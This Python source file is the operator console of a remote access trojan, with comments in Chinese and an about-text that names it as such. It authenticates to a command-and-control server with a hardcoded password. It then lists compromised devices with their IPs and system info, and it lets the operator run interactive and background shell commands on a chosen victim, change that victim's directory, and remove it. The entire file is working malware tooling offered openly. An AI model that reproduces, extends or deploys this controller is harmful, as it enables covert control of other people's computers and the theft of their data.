import requests
import json

import rich.console
import rich.table
import rich.text

from sys import exit

# 服务器配置
APT_SITE = "http://localhost:5000"  # 服务器地址
API_PATH = "fuck"  # API路径
APT_PASSWORD = "fuck"  # 访问密码

# 日志输出类
class Printer:
    """自定义日志打印器，支持彩色输出"""
    def __init__(self):
        self.console = rich.console.Console()
    
    def log_info(self, message: str):
        """打印信息日志"""
        self.console.log(f"[white on blue][*][/white on blue]", message, style="white")

    def log_warning(self, message: str):
        """打印警告日志"""
        self.console.log(f"[white on yellow][!][/white on yellow]", message, style="yellow")

    def log_error(self, message: str):
        """打印错误日志"""
        self.console.log(f"[white on red][-][/white on red]", message, style="bold red")

    def log_success(self, message: str):
        """打印成功日志"""
        self.console.log(f"[white on green][+][/white on green]", message, style="green")
    
    def log_debug(self, message: str):
        """打印调试日志"""
        self.console.log(f"[grey50][|][/grey50]", message, style="grey50")

def output(*args, type=""):
    """统一日志输出接口"""
    printer = Printer()
    if type.strip() == "":
        printer.console.log(*args)
    else:
        if type == "info":
            printer.log_info(*args)
        elif type == "warning":
            printer.log_warning(*args)
        elif type == "error":
            printer.log_error(*args)
        elif type == "success":
            printer.log_success(*args)
        elif type == "debug":
            printer.log_debug(*args)
        else:
            raise ValueError(f"Invalid type: {type}")

# 服务器操作类
class Server:
    @staticmethod
    def device_list():
        """获取并显示设备列表"""
        response = requests.post(f"{APT_SITE}/{API_PATH}/function", 
                                json={"func_name": "device_list"}, 
                                cookies=cookie)
        if not response.ok: 
            raise Exception(f"请求失败：{response.status_code} {response.json()}")
        result = response.json()
        if type(result) != list:
            output(result, type="info")
            return
        Table = rich.table.Table(title="设备列表")
        Table.add_column("设备ID", justify="center", style="cyan")
        Table.add_column("设备IP", justify="center", style="magenta")
        Table.add_column("设备信息", justify="center", style="green")
        for i in result:
            Table.add_row(rich.text.Text(i["id"], overflow="fold"), 
                            rich.text.Text(i["ip"], overflow="fold"), 
                            rich.text.Text(i["systeminfo"], overflow="fold"))
        output(Table)

    @staticmethod
    def select_device(id):
        """选择要控制的设备"""
        response = requests.post(f"{APT_SITE}/{API_PATH}/function", 
                                    json={"func_name": "command", "id": id, "command": "echo hello world"}, 
                                    cookies=cookie)
        if not response.ok: 
            raise Exception(f"请求失败：{response.status_code} {response.json()}")
        output(f"已选择设备：{id}", type="success")
        return id

    @staticmethod   
    def delete_device(id):
        """删除指定设备"""
        response = requests.post(f"{APT_SITE}/{API_PATH}/function", 
                                    json={"func_name": "delete", "id": id}, 
                                    cookies=cookie)
        if not response.ok: 
            raise Exception(f"请求失败：{response.status_code} {response.json()}")
        output(f"已删除设备：{id}", type="success")
        
    @staticmethod
    def command(id):
        """进入设备命令模式"""
        while True:
            command = input(f"(command)<{id}>>")
            if command.strip().lower() == "exit": 
                break
            response = requests.post(f"{APT_SITE}/{API_PATH}/function", 
                                     json={"func_name": "command", "id": id, "command": command},
                                     cookies=cookie)
            result = response.json()
            if not response.ok: 
                raise Exception(f"请求失败：{response.status_code} {result["error"]}")
            result = json.loads(result["message"])
            for i in result.items():
                output(f"{i[0]}: {i[1]}", type="info")
    
    @staticmethod
    def background(id, command):
        """在设备上后台执行命令"""
        response = requests.post(f"{APT_SITE}/{API_PATH}/function", 
                                json={"func_name": "background", "id": id, "command": command}, 
                                cookies=cookie)
        result = response.json()
        if not response.ok: 
            raise Exception(f"请求失败：{response.status_code} {result["error"]}")
        if "已发送" in result["message"]:
            output(f"已成功在后台运行命令：{command}", type="success")
        else:
            output(f"命令执行失败：{result["message"]}", type="error")
    
    @staticmethod
    def cd(id, directory):
        """切换设备工作目录"""
        response = requests.post(f"{APT_SITE}/{API_PATH}/function", 
                                json={"func_name": "change_directory", "id": id, "directory": directory}, 
                                cookies=cookie)
        result = response.json()
        if not response.ok: 
            raise Exception(f"请求失败：{response.status_code} {result["error"]}")
        if "successfully" in result["message"]:
            output(f"已切换工作目录：{directory}", type="success")
        else:
            output(f"切换工作目录失败：{result["message"]}", type="error")

def command_input():
    """命令行交互主循环"""
    select_device = None
    while True:
        try:
            # 设备控制模式
            if not select_device is None:
                command = input(f"(console)<{select_device}>>")
                command = command.strip()
                match command:
                    case "": pass
                    case "help": 
                        output('''帮助信息：
    [u bold yellow]help[/u bold yellow]：[green]显示帮助信息[/green]
    [u bold yellow]back[/u bold yellow]：[green]退出到上一级[/green]
    [u bold yellow]clear[/u bold yellow]：[green]清空终端屏幕[/green]
    [u bold yellow]list[/u bold yellow]：[green]显示已连接的设备列表[/green]
    [u bold yellow]select <id>[/u bold yellow]：[green]选择一个设备进行控制[/green]
    [u bold yellow]command[/u bold yellow]：[green]进入command,可在对方下命令并返回结果[/green]
    [u bold yellow]background <command>[/u bold yellow]：[green]在后台运行命令，不返回结果[/green]
    [u bold yellow]cd <dir>[/u bold yellow]：[green]切换工作目录[/green]''', type="info")
                    case "back": 
                        select_device = None
                    case "clear": 
                        print("\033c")
                    case "list": 
                        Server.device_list()
                    case command if command.startswith("select "): 
                        select_device = Server.select_device(command.split(" ", 1)[1])
                    case command if command.startswith("command"): 
                        Server.command(select_device)
                    case command if command.startswith("bg "): 
                        Server.background(select_device, command.split(" ", 1)[1])
                    case command if command.startswith("cd "): 
                        Server.cd(select_device, command.split(" ", 1)[1])
                    case _: 
                        output(f"未知命令：{command}，输入help查看帮助", type="error")
                continue

            # 服务器控制模式
            command = input("(server)>")
            command = command.strip().lower()
            match command:
                case "": pass
                case "exit": 
                    exit(0)
                case "help":
                    output('''帮助信息：
    [u bold yellow]help[/u bold yellow]：[green]显示帮助信息[/green]
    [u bold yellow]about[/u bold yellow]：[green]显示关于信息[/green]
    [u bold yellow]exit[/u bold yellow]：[green]退出程序[/green]
    [u bold yellow]clear[/u bold yellow]：[green]清空终端屏幕[/green]
    [u bold yellow]list[/u bold yellow]：[green]显示已连接的设备列表[/green]
    [u bold yellow]select <id>[/u bold yellow]：[green]选择一个设备进行控制[/green]
    [u bold yellow]delete <id>[/u bold yellow]：[green]删除已连接的设备[/green]'''  , type="info")
                case "clear": 
                    print("\033c")
                case "about": 
                    output('''关于：
作者：赵博凯
版权：Copyright © 赵博凯, All Rights Reserved.
此为开源软件，链接：[link=https://github.com/zhaobokai341/remote_access_trojan]https://github.com/zhaobokai341/remote_access_trojan[/link]
使用MIT协议，请自觉遵守协议''', type="info")
                case "list": 
                    Server.device_list()
                case command if command.startswith("select "): 
                    select_device = Server.select_device(command.split(" ", 1)[1])
                case command if command.startswith("delete "): 
                    Server.delete_device(command.split(" ", 1)[1])
                case _: 
                    output(f"未知命令：{command}，输入help查看帮助", type="error")
        except Exception as e:
            output(f"发生错误: {type(e).__name__}：{e}", type="error")

if __name__ == "__main__":
    # 程序入口
    output("版权所有：Copyright © 赵博凯, All Rights Reserved.", type="info")
    output("程序启动", type="info")
    output("正在验证密码", type="info")
    try:
        # 验证服务器密码
        response = requests.post(f"{APT_SITE}/{API_PATH}/verify", json={"password": APT_PASSWORD})
        if response.status_code == 200:
            cookie = response.json()
            output(f"验证成功，cookie: {cookie}", type="success")
        else:
            output(f"验证失败：{response.status_code} {response.json()}", type="error")
            exit(1)
    except Exception as e:
        output(f"验证失败: {type(e).__name__}：{e}", type="error")
        exit(1)

    try:
        # 启动命令行交互
        command_input()
    except Exception as e:
        output(f"发生错误: {type(e).__name__}：{e}", type="error")
    except KeyboardInterrupt:
        output("用户手动中断", type="warning")
        exit(1)
